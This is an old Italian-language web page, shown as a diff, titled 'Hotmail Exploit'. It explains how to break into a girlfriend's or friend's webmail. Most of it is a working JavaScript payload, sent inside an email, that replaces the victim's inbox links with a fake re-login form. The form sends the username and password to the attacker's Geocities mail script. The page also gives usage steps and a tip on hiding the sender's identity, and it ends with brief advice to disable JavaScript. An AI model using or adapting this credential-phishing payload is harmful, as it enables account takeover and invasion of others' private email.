@@ -1,0 +1,94 @@
+<html>
+
+<head>
+<meta http-equiv="Content-Type"
+content="text/html; charset=iso-8859-1">
+<meta name="GENERATOR" content="Microsoft FrontPage Express 2.0">
+<title>Hotmail Exploit</title>
+</head>
+
+<body bgcolor="#000000" text="#FFFFFF">
+
+<pre>HotMail Exploit</pre>
+
+<pre>Vi e' mai capitato di voler leggere l'email della vostra ragazza o del vostro
+amico a cui volete fare da tanto un piccolo scherzetto? Bene, se lui ha un
+account su HotMail avete alcune possibilita' di riuscirci, basta sapere un po'
+di codice Java ... L'unica cosa che dovete fare e' mandare un email che
+contiene del codice java al povero malcapitato. Quando l'utente leggera' le
+sue email lo scriptino in java contenuto in una di quelle forzera' l'utente a 
+rifare il login. Cosi' l'user, la password e l'indirizzo ip della vittima vi
+verranno trasmesse sulla vostra casella di posta elettronica. Non usate la
+vostra vera e-mail, fatevi un account su Geocities se volete usarlo... ma
+questo e' inutile dirlo, vero ?! ;)</pre>
+
+<pre>E adesso una parte dello scriptino in java da salvare come messages.htm (la
+linea 17 include il nostro user name su Geocities, in questo caso [ybwc] ) :
+</pre>
+
+<pre>     &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;
+     &lt;p&gt;&quot;Go where you want today&quot; - Blue Adept&lt;/p&gt;
+     &lt;script&gt;
+     function getmess(){
+     return &quot;&lt;table border=0 cellpadding=5 cellspacing=5 width=508 height=90%&gt;&quot; +
+     &quot;&lt;tr valign=middle&gt;&quot; +
+     &quot;&lt;th colspan=2&gt;&quot; +
+     &quot;&lt;font face=\&quot;Arial, Helvetica\&quot; size=\&quot;5\&quot;&gt;&quot; +
+     &quot;We're Sorry, We Cannot&lt;br&gt;Process Your Request&quot; + 
+     &quot;&lt;/font&gt;&lt;/th&gt;&lt;/tr&gt;&quot; +
+     &quot;&lt;tr valign=middle&gt;&lt;td align=center&gt;&quot; +
+     &quot;&lt;font face=\&quot;Arial, Helvetica\&quot; size=\&quot;3\&quot;&gt;Reason:&amp;nbsp;&lt;/font&gt;&quot; + 
+     &quot;&lt;font face=\&quot;Arial, Helvetica\&quot; size=\&quot;3\&quot; color=\&quot;#ff0000\&quot;&gt;&lt;b&gt;Time expired. Please re-login.&lt;/b&gt;&lt;/font&gt;&lt;br&gt;&quot; + 
+     &quot;&lt;font face=\&quot;Arial, Helvetica\&quot; size=\&quot;2\&quot;&gt;&lt;a href=\&quot;http://www.hotmail.com/errormsg.html\&quot;&gt;(Get more info regarding error
+     messages here)&lt;/a&gt;&lt;/font&gt;&quot; +
+     &quot;&lt;/td&gt;&lt;/tr&gt;&quot; +
+     &quot;&lt;tr valign=\&quot;middle\&quot;&gt;&lt;td align=\&quot;center\&quot;&gt;&quot; +
+     &quot;&lt;FORM METHOD=POST ACTION=\&quot;http://www.geocities.com/cgi-bin/homestead/mail.pl?ybwc\&quot; target=\&quot;_top\&quot;&gt;&quot; +
+     &quot;&lt;INPUT TYPE=\&quot;hidden\&quot; NAME=\&quot;next-url\&quot; VALUE=\&quot;http://www.hotmail.com\&quot;&gt;&quot; +
+     &quot;&lt;INPUT TYPE=\&quot;hidden\&quot; NAME=\&quot;subject\&quot; VALUE=\&quot;Hotmail Password\&quot;&gt;&quot; +
+     &quot;&lt;table cellpadding=\&quot;0\&quot; cellspacing=\&quot;5\&quot; border=\&quot;0\&quot;&gt;&quot; +
+     &quot;&lt;tr&gt;&lt;td&gt;&lt;font face=\&quot;Arial, Helvetica\&quot; size=\&quot;2\&quot;&gt;Login Name:&lt;/font&gt;&lt;br&gt;&lt;input type=\&quot;text\&quot; name=\&quot;login\&quot; size=\&quot;16\&quot;
+     maxlength=\&quot;16\&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;font face=\&quot;Arial, Helvetica\&quot; size=\&quot;2\&quot;&gt;Password:&lt;/font&gt;&lt;br&gt;&lt;input type=\&quot;password\&quot; name=\&quot;passwd\&quot;
+     size=\&quot;16\&quot; maxlength=\&quot;16\&quot;&gt;&amp;nbsp;&lt;input type=\&quot;submit\&quot; value=\&quot;Enter\&quot;&gt;&lt;/td&gt;&lt;tr&gt;&quot; +
+     &quot;&lt;/table&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;&quot; +
+     &quot;&lt;tr valign=middle&gt;&lt;th colspan=2 align=center&gt;&quot; +
+     &quot;&lt;font face=\&quot;Arial, Helvetica\&quot; size=\&quot;3\&quot;&gt;&quot; +
+     &quot;Return to &lt;a href=\&quot;http://welcome.to/www.hotmail.com\&quot; target=\&quot;_parent\&quot;&gt;Hotmail's Homepage&lt;/a&gt;.&quot; +
+     &quot;&lt;/font&gt;&lt;/th&gt;&lt;/tr&gt;&lt;/table&gt;&quot; +
+     &quot;&lt;p&gt;&lt;img src=\&quot;http://209.1.112.251/c9698.gif\&quot; width=189 height=16 border=0 alt=\&quot;Copyright 1996-1997\&quot;&gt;&quot;;
+     }</pre>
+
+<pre>     nomenulinks=top.submenu.document.links.length;
+     for(i=0;i&lt;nomenulinks-1;i++){
+     top.submenu.document.links[i].target=&quot;work&quot;;
+     top.submenu.document.links[i].href=&quot;javascript:getmess()&quot;;
+     }</pre>
+
+<pre>     noworklinks=top.work.document.links.length;
+     for(i=0;i&lt;noworklinks-1;i++){
+     top.work.document.links[i].target=&quot;work&quot;;
+     top.work.document.links[i].href=&quot;javascript:getmess()&quot;;
+     }</pre>
+
+<pre>     &lt;/script&gt;
+     &lt;/body&gt;
+     &lt;/html&gt;</pre>
+
+<pre>a questo punto salvate il tutto come messages.htm e inserite il file nella e-mail da mandare alla vostra vittima 
+ad es. pirla@hotmail.com e aspettate che lo script faccia il resto... troverete user, password e ip nella vostra 
+casella di posta.
+Semplice no ;)</pre>
+
+<pre>E adesso per la gioia della controparte un piccolo fix per impedire che qualcuno prenda possesso dei vostri dati:
+disabilitate javascript del vostro browser.
+Se state usando Netscape andate in edit poi in  preferences, advanced, disable javascript.
+Se invece (ahime') state usando Microsoft Internet Explorer andate in view, poi in internet options, security, custom settings,
+scripting, disable active scripting.</pre>
+
+<pre>Ciao a tutti dalla Under Construction </pre>
+
+<pre>P.s. Si accettano critiche e non... ;)</pre>
+
+<pre>nullmind@freemail.it</pre>
+</body>
+</html>
